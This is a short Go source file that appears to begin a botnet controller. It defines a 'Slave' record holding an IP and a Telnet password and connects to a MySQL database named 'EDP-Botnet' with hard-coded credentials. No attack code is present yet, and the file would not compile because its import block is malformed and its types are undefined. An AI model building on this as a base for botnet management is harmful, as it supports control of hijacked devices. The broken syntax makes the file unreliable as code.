package main

import (
  import "database/sql"
  import _ "github.com/go-sql-driver/mysql"
)

type Slave struct{
  ip string
  senhaTelnet string
}

func db_connect(databaseSource string) (*DB){
  db, err := sql.Open("mysql",databaseSource)
  if err != nil{
    panic(err)
  }
  return db
}

func main(){
  db:=db_connect("B0tN3t:45p1r1n4@/EDP-Botnet")

}
